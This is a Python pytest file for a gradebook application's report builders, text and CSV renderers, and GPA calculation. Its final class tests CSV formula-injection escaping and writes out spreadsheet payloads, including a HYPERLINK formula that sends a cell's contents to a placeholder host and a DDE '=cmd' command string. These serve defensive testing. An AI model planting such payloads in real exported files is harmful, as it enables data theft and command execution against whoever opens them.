"""Report building and rendering."""

from __future__ import annotations

from dataclasses import asdict

import pytest

from notenverwaltung.exceptions import CourseNotFoundError, StudentNotFoundError
from notenverwaltung.gradebook import GradeBook
from notenverwaltung.grading_scale import GradeBand, GradingScale
from notenverwaltung.models import Course
from notenverwaltung.reports import CsvReportGenerator, ReportBuilder, TextReportGenerator
from notenverwaltung.reports.csv_report import escape_formula
from notenverwaltung.storage import GradeStore


@pytest.fixture
def builder(gradebook: GradeBook) -> ReportBuilder:
    return ReportBuilder(gradebook)


class TestStudentReport:
    def test_carries_the_numbers_needed_to_render(self, builder: ReportBuilder) -> None:
        report = builder.student_report("S001")
        assert report.student_name == "Anna Schmidt"
        assert len(report.grades) == 2
        assert report.average_percentage == pytest.approx(87.5)
        assert (report.passed_count, report.failed_count, report.courses_graded) == (2, 0, 2)

    def test_contains_no_prose(self, builder: ReportBuilder) -> None:
        """The frontend renders the language; the backend ships no message catalogue.

        Every string in the payload must be data — a name, an id, an ISO date, a band
        label — never a sentence.
        """
        payload = asdict(builder.student_report("S001"))
        assert set(payload) == {
            "student_id",
            "student_name",
            "email",
            "grades",
            "courses",
            "average_percentage",
            "gpa",
            "passed_count",
            "failed_count",
            "courses_graded",
        }
        assert " " not in payload["grades"][0]["letter"]
        # The GPA is a number, not a rendered "3.9 / 4.0". Formatting is the
        # frontend's, and it differs by locale before it differs by scale.
        assert payload["gpa"] is None or isinstance(payload["gpa"], (int, float))

    def test_ungraded_student_yields_none_not_zero(self, builder: ReportBuilder) -> None:
        report = builder.student_report("S003")
        assert report.grades == []
        assert report.average_percentage is None

    def test_unknown_student_raises(self, builder: ReportBuilder) -> None:
        with pytest.raises(StudentNotFoundError):
            builder.student_report("ghost")


class TestCourseReport:
    def test_carries_the_numbers_needed_to_render(self, builder: ReportBuilder) -> None:
        report = builder.course_report("CS101")
        assert report.average_score == pytest.approx(65.0)
        assert report.pass_rate == pytest.approx(50.0)
        assert report.graded_student_count == 2
        assert report.distribution == {"A": 0, "B": 1, "C": 0, "D": 0, "F": 1}

    def test_ungraded_course_yields_none(self, gradebook: GradeBook) -> None:
        gradebook.add_course(Course("CS999", "Empty"))
        report = ReportBuilder(gradebook).course_report("CS999")
        assert (report.average_score, report.pass_rate) == (None, None)

    def test_unknown_course_raises(self, builder: ReportBuilder) -> None:
        with pytest.raises(CourseNotFoundError):
            builder.course_report("ghost")


class TestSummaryReport:
    def test_carries_totals_and_rankings(self, builder: ReportBuilder) -> None:
        report = builder.summary_report()
        assert (report.student_count, report.course_count, report.grade_count) == (3, 2, 3)
        assert [sid for sid, _, _ in report.top_students] == ["S001", "S002"]
        assert [sid for sid, _, _ in report.at_risk_students] == ["S002"]

    def test_threshold_is_echoed_so_the_ui_can_label_it(self, builder: ReportBuilder) -> None:
        assert builder.summary_report(at_risk_threshold=70.0).at_risk_threshold == 70.0


class TestPolymorphism:
    """Every generator consumes the same dataclasses — that is the polymorphism.

    `ReportGenerator` is an abstract base with two concrete renderers. Neither knows
    anything about storage or statistics: they are handed a finished report and asked
    to format it, which is what makes adding a third format a leaf change.
    """

    def test_both_generators_accept_the_same_report(self, builder: ReportBuilder) -> None:
        report = builder.student_report("S001")
        for generator in (TextReportGenerator(), CsvReportGenerator()):
            assert generator.render_student(report)

    def test_text_includes_the_key_figures(self, builder: ReportBuilder) -> None:
        output = TextReportGenerator().render_student(builder.student_report("S001"))
        assert "Anna Schmidt" in output
        assert "87.5%" in output

    def test_text_labels_are_overridable(self, builder: ReportBuilder) -> None:
        output = TextReportGenerator({"average": "Durchschnitt"}).render_student(
            builder.student_report("S001")
        )
        assert "Durchschnitt" in output

    def test_text_handles_an_empty_report(self, builder: ReportBuilder) -> None:
        assert "No grades recorded." in TextReportGenerator().render_student(
            builder.student_report("S003")
        )

    def test_text_course_report(self, builder: ReportBuilder) -> None:
        output = TextReportGenerator().render_course(builder.course_report("CS101"))
        assert "Intro to Programming" in output
        assert "Anna Schmidt" in output
        assert "50.0%" in output  # pass rate
        assert "B:1" in output  # distribution

    def test_text_course_report_handles_no_grades(self, gradebook: GradeBook) -> None:
        gradebook.add_course(Course("CS999", "Empty"))
        output = TextReportGenerator().render_course(
            ReportBuilder(gradebook).course_report("CS999")
        )
        assert "No grades recorded." in output

    def test_text_summary_report(self, builder: ReportBuilder) -> None:
        output = TextReportGenerator().render_summary(builder.summary_report())
        assert "3 students, 2 courses, 3 grades" in output
        assert "Top students:" in output
        assert "At risk (< 60%):" in output

    def test_text_summary_omits_empty_sections(self, store: GradeStore) -> None:
        """An institution with no data should not render an empty 'At risk' heading."""
        output = TextReportGenerator().render_summary(
            ReportBuilder(GradeBook(store)).summary_report()
        )
        assert "Top students:" not in output
        assert "At risk" not in output


class TestRenderers:
    """CSV is the one format the *product* renders server-side.

    A downloaded file has no frontend to translate it, so headers and delimiter are
    the renderer's problem. Every other format the API serves is JSON, shaped by the
    dataclasses themselves.
    """

    def test_csv_headers_are_translatable(self, builder: ReportBuilder) -> None:
        """A downloaded file has no frontend, so this one format translates server-side."""
        output = CsvReportGenerator({"score": "Note", "date": "Datum"}).render_student(
            builder.student_report("S001")
        )
        header = output.splitlines()[0]
        assert "Note" in header and "Datum" in header

    def test_csv_delimiter_is_configurable(self, builder: ReportBuilder) -> None:
        """German and French Windows Excel expects ';'. With ',' the file opens as
        one column, which reads to the user as corruption."""
        output = CsvReportGenerator(delimiter=";").render_student(builder.student_report("S001"))
        assert ";" in output.splitlines()[0]

    def test_csv_row_count_matches_the_grades(self, builder: ReportBuilder) -> None:
        output = CsvReportGenerator().render_course(builder.course_report("CS101"))
        assert len(output.strip().splitlines()) == 3  # header + 2 grades

    def test_csv_summary_report(self, builder: ReportBuilder) -> None:
        output = CsvReportGenerator().render_summary(builder.summary_report())
        assert "students,3" in output
        assert "band_A,1" in output
        assert "S001" in output  # ranking section

    def test_csv_summary_average_is_blank_when_ungraded(self, store: GradeStore) -> None:
        """Blank, not 0 — a spreadsheet formula over a 0 would report a false average."""
        output = CsvReportGenerator().render_summary(
            ReportBuilder(GradeBook(store)).summary_report()
        )
        assert "average_percentage," in output


class TestGradePointAverage:
    """The GPA weights each *course* by its credits; `average_percentage` weights
    each *mark* by its own weight. Two different questions, two different numbers.
    """

    def test_a_course_result_exists_per_graded_course(self, builder: ReportBuilder) -> None:
        report = builder.student_report("S001")

        # Name order, not id order: "Data Structures" (CS102) before "Intro to
        # Programming" (CS101).
        assert [(c.course_id, c.grade_count) for c in report.courses] == [
            ("CS102", 1),
            ("CS101", 1),
        ]

    def test_equal_credits_average_the_points(self, builder: ReportBuilder) -> None:
        # Anna: 85% in CS101 (B, 3.0) and 90% in CS102 (A, 4.0), one credit each.
        assert builder.student_report("S001").gpa == pytest.approx(3.5)

    def test_credits_actually_weight_the_average(self, gradebook: GradeBook) -> None:
        """The whole point of a GPA over a plain mean. A three-credit course must
        pull the number three times as hard as a one-credit one."""
        gradebook.add_course(Course("CS300", "Thesis", max_grade=100.0, credits=3.0))
        gradebook.record_grade("S001", "CS300", 95, "2026-02-01", title="Report")

        report = ReportBuilder(gradebook).student_report("S001")

        # B(3.0) at 1 credit + A(4.0) at 1 + A(4.0) at 3 = 19.0 over 5 credits.
        assert report.gpa == pytest.approx(3.8)

    def test_an_unpriced_scale_reports_no_gpa(self, gradebook: GradeBook) -> None:
        """Rather than zero, which would read as a student who failed everything."""
        gradebook.scale = GradingScale(bands=(GradeBand(50, "pass"), GradeBand(0, "retry")))

        report = ReportBuilder(gradebook).student_report("S001")

        assert report.gpa is None
        assert [c.points for c in report.courses] == [None, None]
        assert [c.letter for c in report.courses] == ["pass", "pass"]

    def test_an_ungraded_student_has_no_gpa(self, builder: ReportBuilder) -> None:
        report = builder.student_report("S003")

        assert report.courses == []
        assert report.gpa is None

    def test_course_results_are_ordered_by_name(self, builder: ReportBuilder) -> None:
        """So the same student produces the same report twice."""
        names = [c.course_name for c in builder.student_report("S001").courses]

        assert names == sorted(names)


class TestFormulaEscaping:
    """A downloaded report opens in Excel, and several columns are free text.

    A teacher writes `grades.title` and `notes`; any signed-in user writes their
    own `full_name` through their profile. A cell beginning `=` is a formula, and
    `=HYPERLINK("http://…"&A2,"Results")` exfiltrates the row beside it the moment
    an administrator opens the file.
    """

    def test_a_formula_is_neutralised(self) -> None:
        """The conventional apostrophe: the cell stays readable, stops executing."""
        assert escape_formula('=HYPERLINK("http://x/?d="&A2,"Click")').startswith("'=")
        assert escape_formula("+1+1") == "'+1+1"
        assert escape_formula("@SUM(A1)") == "'@SUM(A1)"
        assert escape_formula("\tcmd") == "'\tcmd"

    def test_numbers_are_left_alone(self) -> None:
        """The counterweight. Quoting every leading minus would break real figures."""
        assert escape_formula("-1.00") == "-1.00"
        assert escape_formula("-0.5") == "-0.5"
        assert escape_formula(42) == 42
        assert escape_formula(3.5) == 3.5
        assert escape_formula(None) is None

    def test_ordinary_text_is_untouched(self) -> None:
        """Most cells are names and ids and must survive unchanged."""
        assert escape_formula("Anna Schmidt") == "Anna Schmidt"
        assert escape_formula("CS101") == "CS101"
        assert escape_formula("") == ""

    def test_a_rendered_report_carries_the_escape(self, gradebook: GradeBook) -> None:
        """End to end: the wrap is on the writer, so no row can forget it."""
        gradebook.record_grade("S001", "CS101", 70, "2026-03-01", title="=cmd|'/c calc'!A1")

        output = CsvReportGenerator().render_student(
            ReportBuilder(gradebook).student_report("S001")
        )

        assert "'=cmd" in output
        assert "\n=cmd" not in output
